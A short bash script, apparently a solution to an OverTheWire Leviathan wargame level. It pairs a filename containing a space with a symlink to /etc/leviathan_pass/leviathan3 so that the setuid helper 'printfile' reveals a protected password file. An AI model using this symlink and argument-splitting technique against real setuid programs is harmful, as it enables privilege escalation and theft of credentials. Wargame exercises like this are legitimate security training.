#!/usr/bin/env bash

TMP_DIR=$(mktemp -d)

touch $TMP_DIR/"pass.txt word.txt" && ln -s /etc/leviathan_pass/leviathan3 $TMP_DIR/word.txt && ~/printfile $TMP_DIR/"pass.txt word.txt" 2>/dev/null
